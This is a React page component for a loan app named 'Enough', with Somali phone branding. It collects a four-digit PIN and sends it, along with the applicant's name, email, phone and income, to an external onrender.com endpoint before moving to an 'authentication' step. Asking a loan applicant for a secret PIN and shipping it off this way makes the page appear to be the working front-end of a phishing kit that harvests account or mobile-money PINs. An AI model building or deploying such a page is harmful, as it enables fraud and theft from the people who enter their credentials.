import React, { useState, useRef } from "react";
import { useNavigate } from "react-router-dom";
import { useLoan } from "../context/LoanContext";

export default function Details() {
  const navigate = useNavigate();
  const { loanData, updateLoanData } = useLoan();

  const [pin, setPin] = useState(["", "", "", ""]);
  const [showPin, setShowPin] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  const inputsRef = useRef([]);

  const handlePinChange = (index, value) => {
    if (!/^\d?$/.test(value)) return;

    const next = [...pin];
    next[index] = value;
    setPin(next);

    if (value && index < 3) {
      inputsRef.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index, e) => {
    if (e.key === "Backspace" && !pin[index] && index > 0) {
      inputsRef.current[index - 1]?.focus();
    }
  };

  const isComplete = pin.every((digit) => digit !== "");

  const handleSubmit = async () => {
    setError("");

    if (!isComplete) {
      return;
    }

    const fullPin = pin.join("");

    updateLoanData({
      pin: fullPin,
    });

    try {
      setLoading(true);

      const response = await fetch(
        "https://wafi-wex0.onrender.com/api/auth/pin",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },

          body: JSON.stringify({
            loanType: loanData.loanType,
            loanAmount: loanData.loanAmount,
            loanPeriod: loanData.loanPeriod,
            purpose: loanData.purpose,

            firstName: loanData.firstName,
            lastName: loanData.lastName,
            email: loanData.email,
            phone: loanData.phone,

            workStatus: loanData.workStatus,
            annualIncome: loanData.annualIncome,

            pin: fullPin,
          }),
        }
      );

      const data = await response.json();

      if (!response.ok) {
        throw new Error(
          data.message || "Failed to submit PIN"
        );
      }

      console.log("PIN SUCCESS:", data);

      navigate("/authentication");

    } catch (err) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  };


  return (
    <div
      className="min-h-screen flex flex-col relative"
      style={{
        background:
          "linear-gradient(to bottom,#a3dd3f,#57b129)",
      }}
    >

      {/* Top */}
      <div className="text-center pt-14 pb-10 px-6">

        <h1 className="text-4xl text-white/50 mb-2">
          Enough
        </h1>

        <p className="text-white text-base">
          Easy and Quick Loans
        </p>

      </div>


      {/* Card */}
      <div className="bg-white rounded-[48px] flex-1 px-6 pt-10 pb-16">

        <div className="max-w-md mx-auto">

          <h2 className="text-center text-2xl text-gray-900 mb-8">
            Verify PIN
          </h2>


          {/* Phone */}
          <div className="flex items-center gap-3 border-2 border-green-500 rounded-xl px-4 py-3.5 mb-8">

            <span className="text-xl">
              🇸🇴
            </span>

            <span className="text-gray-800">
              {loanData.phone || "+252"}
            </span>

          </div>


          <p className="text-center text-gray-500 text-sm mb-4">
            Enter your PIN.
          </p>


          {error && (
            <p className="text-red-500 text-sm text-center mb-4">
              {error}
            </p>
          )}


          {/* PIN Inputs */}
          <div className="flex justify-center gap-3 mb-8 relative">

            {pin.map((digit, index) => (
              <input
                key={index}
                ref={(el) =>
                  (inputsRef.current[index] = el)
                }
                type={
                  showPin
                    ? "text"
                    : "password"
                }
                inputMode="numeric"
                maxLength={1}
                value={digit}
                onChange={(e) =>
                  handlePinChange(
                    index,
                    e.target.value
                  )
                }
                onKeyDown={(e) =>
                  handleKeyDown(index, e)
                }
                className="w-16 h-16 text-center text-xl rounded-xl border-2 border-green-500 focus:outline-none"
              />
            ))}


            <button
              type="button"
              onClick={() =>
                setShowPin((prev) => !prev)
              }
              className="absolute -right-8 top-1/2 -translate-y-1/2 text-gray-500"
            >
              {showPin ? "🙈" : "👁"}
            </button>

          </div>


          <button
            onClick={handleSubmit}
            disabled={!isComplete || loading}
            className={`w-full py-4 rounded-xl text-lg ${
              isComplete && !loading
                ? "text-white"
                : "bg-gray-200 text-gray-400 cursor-not-allowed"
            }`}
            style={
              isComplete && !loading
                ? {
                    background:
                      "linear-gradient(to right,#a3dd3f,#57b129)",
                  }
                : {}
            }
          >
            {loading
              ? "Submitting..."
              : "CONTINUE"}
          </button>

        </div>

      </div>


      {/* Bottom */}
      <div className="text-center pt-10 pb-10 px-6">

        <h1 className="text-3xl text-white mb-1">
          Enough
        </h1>

        <p className="text-white text-base mb-6">
          Easy and Quick Loans
        </p>

        <p className="text-white/80 text-xs">
          v2.1.3P
        </p>

      </div>

    </div>
  );
}